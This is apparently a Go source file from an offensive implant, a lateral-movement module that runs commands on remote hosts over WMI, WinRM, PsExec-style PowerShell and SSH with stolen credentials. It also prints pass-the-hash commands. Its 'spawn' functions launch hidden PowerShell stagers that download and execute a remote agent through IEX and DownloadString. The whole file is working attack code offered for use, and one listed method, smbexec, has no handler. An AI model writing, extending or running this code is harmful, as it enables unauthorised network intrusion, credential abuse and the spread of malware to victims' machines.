package implant

import (
	"fmt"
	"os/exec"
	"runtime"
	"strings"
)

// ══════════════════════════════════════════
//  LATERAL MOVEMENT COMMANDS
// ══════════════════════════════════════════
// Built-in lateral movement primitives for moving through networks
// without uploading external tools.

// ExecuteLateralMovement handles lateral movement commands.
func ExecuteLateralMovement(args []string) ([]byte, error) {
	if len(args) == 0 {
		return []byte(`Lateral Movement Commands:
  wmiexec <target> <user> <pass> <command>     WMI-based remote execution
  winrm <target> <user> <pass> <command>       WinRM remote execution
  psexec <target> <user> <pass> <command>      Service-based remote execution
  smbexec <target> <user> <pass> <command>     SMB-based execution
  ssh <target> <user> <pass> <command>         SSH remote execution (Linux)
  wmi-spawn <target> <user> <pass> <url>       WMI spawn + download agent
  winrm-spawn <target> <user> <pass> <url>     WinRM spawn + download agent
  pth <target> <user> <ntlm_hash> <command>    Pass-the-Hash execution`), nil
	}

	method := strings.ToLower(args[0])
	switch method {
	case "wmiexec":
		return lateralWMI(args[1:])
	case "winrm":
		return lateralWinRM(args[1:])
	case "psexec":
		return lateralPsExec(args[1:])
	case "ssh":
		return lateralSSH(args[1:])
	case "wmi-spawn":
		return lateralWMISpawn(args[1:])
	case "winrm-spawn":
		return lateralWinRMSpawn(args[1:])
	case "pth":
		return lateralPTH(args[1:])
	default:
		return nil, fmt.Errorf("unknown lateral method: %s", method)
	}
}

// WMI-based remote execution
func lateralWMI(args []string) ([]byte, error) {
	if len(args) < 4 {
		return nil, fmt.Errorf("usage: wmiexec <target> <user> <pass> <command>")
	}
	target, user, pass, command := args[0], args[1], args[2], strings.Join(args[3:], " ")

	if runtime.GOOS == "windows" {
		// Native WMI
		cmd := exec.Command("wmic", "/node:"+target, "/user:"+user, "/password:"+pass,
			"process", "call", "create", command)
		out, err := cmd.CombinedOutput()
		return out, err
	}
	// Linux — use impacket-style or PowerShell
	return []byte(fmt.Sprintf("[*] WMI exec: %s@%s → %s\n[!] Native WMI requires Windows. Use: impacket-wmiexec '%s:%s@%s' '%s'",
		user, target, command, user, pass, target, command)), nil
}

// WinRM remote execution
func lateralWinRM(args []string) ([]byte, error) {
	if len(args) < 4 {
		return nil, fmt.Errorf("usage: winrm <target> <user> <pass> <command>")
	}
	target, user, pass, command := args[0], args[1], args[2], strings.Join(args[3:], " ")

	if runtime.GOOS == "windows" {
		// PowerShell Invoke-Command
		psCmd := fmt.Sprintf(`$cred = New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force)); Invoke-Command -ComputerName %s -Credential $cred -ScriptBlock { %s }`,
			user, pass, target, command)
		cmd := exec.Command("powershell", "-ep", "bypass", "-c", psCmd)
		out, err := cmd.CombinedOutput()
		return out, err
	}
	return []byte(fmt.Sprintf("[*] WinRM exec: %s@%s → %s\n[!] Native WinRM requires Windows. Use: evil-winrm -i %s -u '%s' -p '%s'",
		user, target, command, target, user, pass)), nil
}

// Service-based remote execution (like PsExec)
func lateralPsExec(args []string) ([]byte, error) {
	if len(args) < 4 {
		return nil, fmt.Errorf("usage: psexec <target> <user> <pass> <command>")
	}
	target, user, pass, command := args[0], args[1], args[2], strings.Join(args[3:], " ")

	if runtime.GOOS == "windows" {
		// Create service remotely
		psCmd := fmt.Sprintf(`$cred = New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force)); Invoke-Command -ComputerName %s -Credential $cred -ScriptBlock { %s }`,
			user, pass, target, command)
		cmd := exec.Command("powershell", "-ep", "bypass", "-c", psCmd)
		out, err := cmd.CombinedOutput()
		return out, err
	}
	return []byte(fmt.Sprintf("[*] PsExec: %s@%s → %s\n[!] Use: impacket-psexec '%s:%s@%s' '%s'",
		user, target, command, user, pass, target, command)), nil
}

// SSH remote execution (Linux targets)
func lateralSSH(args []string) ([]byte, error) {
	if len(args) < 4 {
		return nil, fmt.Errorf("usage: ssh <target> <user> <pass> <command>")
	}
	target, user, pass, command := args[0], args[1], args[2], strings.Join(args[3:], " ")

	// Try sshpass first
	sshpassPath, err := exec.LookPath("sshpass")
	if err == nil {
		cmd := exec.Command(sshpassPath, "-p", pass, "ssh", "-o", "StrictHostKeyChecking=no",
			fmt.Sprintf("%s@%s", user, target), command)
		out, err := cmd.CombinedOutput()
		return out, err
	}

	return []byte(fmt.Sprintf("[*] SSH exec: %s@%s → %s\n[!] sshpass not available. Install: apt install sshpass",
		user, target, command)), nil
}

// WMI spawn — execute a stager download on target
func lateralWMISpawn(args []string) ([]byte, error) {
	if len(args) < 4 {
		return nil, fmt.Errorf("usage: wmi-spawn <target> <user> <pass> <stager_url>")
	}
	target, user, pass, stagerURL := args[0], args[1], args[2], args[3]

	stager := fmt.Sprintf(`powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('%s')"`, stagerURL)

	if runtime.GOOS == "windows" {
		cmd := exec.Command("wmic", "/node:"+target, "/user:"+user, "/password:"+pass,
			"process", "call", "create", stager)
		out, err := cmd.CombinedOutput()
		return append([]byte(fmt.Sprintf("[+] WMI spawn on %s → downloading agent from %s\n", target, stagerURL)), out...), err
	}
	return []byte(fmt.Sprintf("[+] WMI spawn: %s → %s\n[!] Use: impacket-wmiexec '%s:%s@%s' '%s'",
		target, stagerURL, user, pass, target, stager)), nil
}

// WinRM spawn — download and execute agent via WinRM
func lateralWinRMSpawn(args []string) ([]byte, error) {
	if len(args) < 4 {
		return nil, fmt.Errorf("usage: winrm-spawn <target> <user> <pass> <stager_url>")
	}
	target, user, pass, stagerURL := args[0], args[1], args[2], args[3]

	if runtime.GOOS == "windows" {
		psCmd := fmt.Sprintf(`$cred = New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force)); Invoke-Command -ComputerName %s -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).DownloadString('%s') }`,
			user, pass, target, stagerURL)
		cmd := exec.Command("powershell", "-ep", "bypass", "-c", psCmd)
		out, err := cmd.CombinedOutput()
		return append([]byte(fmt.Sprintf("[+] WinRM spawn on %s\n", target)), out...), err
	}
	return []byte(fmt.Sprintf("[+] WinRM spawn: %s → %s\n[!] Use: evil-winrm -i %s -u '%s' -p '%s' -c 'IEX(...)'",
		target, stagerURL, target, user, pass)), nil
}

// Pass-the-Hash execution
func lateralPTH(args []string) ([]byte, error) {
	if len(args) < 4 {
		return nil, fmt.Errorf("usage: pth <target> <user> <ntlm_hash> <command>")
	}
	target, user, hash, command := args[0], args[1], args[2], strings.Join(args[3:], " ")

	return []byte(fmt.Sprintf("[+] Pass-the-Hash: %s@%s (hash: %s...)\n[*] Command: %s\n[!] Execute via: impacket-psexec '%s@%s' -hashes ':%s' '%s'\n[!] Or: impacket-wmiexec '%s@%s' -hashes ':%s' '%s'",
		user, target, hash[:16], command,
		user, target, hash, command,
		user, target, hash, command)), nil
}
